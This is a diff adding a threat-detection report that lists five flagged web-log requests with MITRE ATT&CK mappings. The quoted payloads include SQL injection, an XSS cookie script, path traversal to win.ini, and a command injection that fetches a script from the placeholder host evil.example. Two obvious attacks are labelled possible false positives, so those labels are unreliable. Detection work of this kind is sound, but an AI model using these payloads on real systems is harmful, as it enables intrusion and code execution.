@@ -1,0 +1,53 @@
+==========================================================================================
+              MITRELOG: THREAT DETECTION ENGINE REPORT
+==========================================================================================
+ Target Resource File   : input-sample1.txt
+ Scan Timestamp         : 2026-07-15 20:13:20
+ Total Log Metrics      : 356 transactions evaluated
+ Threat Signatures      : 5 anomalies flagged
+==========================================================================================
+
+[!] MALICIOUS ANOMALY DETECTED [Line 5]
+    ↳ Context/Payload  : /products?id=1%20UNION%20SELECT%20NULL,NULL,NULL--
+    ↳ Full Log Line    : 10.82.30.199 - - [28/Jul/2009:08:58:49 -0700] "GET /products?id=1%20UNION%20SELECT%20NULL,NULL,NULL-- HTTP/1.1" 500 532
+    ↳ Attack Profiling : SQL Injection (SQLi) Attempt
+    ↳ MITRE ATT&CK     : T1190 — Exploit Public-Facing Application
+    ↳ Assigned Severity: HIGH
+    ↳ Intel Scope      : Exploitation of web database validation parameters to run unauthorized SQL commands.
+------------------------------------------------------------------------------------------
+[!] MALICIOUS ANOMALY DETECTED [Line 18]
+    ↳ Context/Payload  : /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+    ↳ Full Log Line    : 10.153.239.5 - - [28/Jul/2009:18:11:30 -0700] "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 200 1984
+    ↳ Attack Profiling : Cross-Site Scripting (XSS)
+    ↳ MITRE ATT&CK     : T1059.007 — Command and Scripting Interpreter: JavaScript
+    ↳ Assigned Severity: MEDIUM
+    ↳ Intel Scope      : Injection of client-side script payloads designed to execute arbitrary code within a victim's browser session.
+------------------------------------------------------------------------------------------
+[!] MALICIOUS ANOMALY DETECTED [Line 218]
+    ↳ Context/Payload  : /products?id=1%27%20OR%20%271%27=%271
+    ↳ Full Log Line    : 10.153.239.5 - - [29/Jul/2009:09:12:13 -0700] "GET /products?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 200 6234 -
+    ↳ Attack Profiling : Unclassified Metric/Behavioral Anomaly
+    ↳ MITRE ATT&CK     : N/A (Manual Review Required) — Potential False Positive or Unmapped Vector
+    ↳ Assigned Severity: LOW/MEDIUM
+    ↳ Intel Scope      : The Random Forest model flagged this payload due to high metric deviancy (atypical length or entropy score), but no explicit malicious threat signatures were matched. Manual verification is recommended to determine if this is a benign edge case.
+------------------------------------------------------------------------------------------
+[!] MALICIOUS ANOMALY DETECTED [Line 262]
+    ↳ Context/Payload  : /../../../../windows/win.ini
+    ↳ Full Log Line    : 10.216.113.172 - - [12/Aug/2009:05:57:55 -0700] "GET /../../../../windows/win.ini HTTP/1.1" 404 302
+    ↳ Attack Profiling : Path Traversal / LFI
+    ↳ MITRE ATT&CK     : T1083 — File and Directory Discovery
+    ↳ Assigned Severity: HIGH
+    ↳ Intel Scope      : Unauthorized file-system path navigation parameters used to map local application folders or access system files.
+------------------------------------------------------------------------------------------
+[!] MALICIOUS ANOMALY DETECTED [Line 317]
+    ↳ Context/Payload  : /admin/ping?ip=8.8.8.8|wget%20http://evil.example/payload.sh
+    ↳ Full Log Line    : 10.216.113.172 - - [12/Aug/2009:05:58:11 -0700] "GET /admin/ping?ip=8.8.8.8|wget%20http://evil.example/payload.sh HTTP/1.1" 500 512
+    ↳ Attack Profiling : Unclassified Metric/Behavioral Anomaly
+    ↳ MITRE ATT&CK     : N/A (Manual Review Required) — Potential False Positive or Unmapped Vector
+    ↳ Assigned Severity: LOW/MEDIUM
+    ↳ Intel Scope      : The Random Forest model flagged this payload due to high metric deviancy (atypical length or entropy score), but no explicit malicious threat signatures were matched. Manual verification is recommended to determine if this is a benign edge case.
+------------------------------------------------------------------------------------------
+
+==========================================================================================
+                        [ SECURITY ANALYSIS REPORT END ]
+==========================================================================================
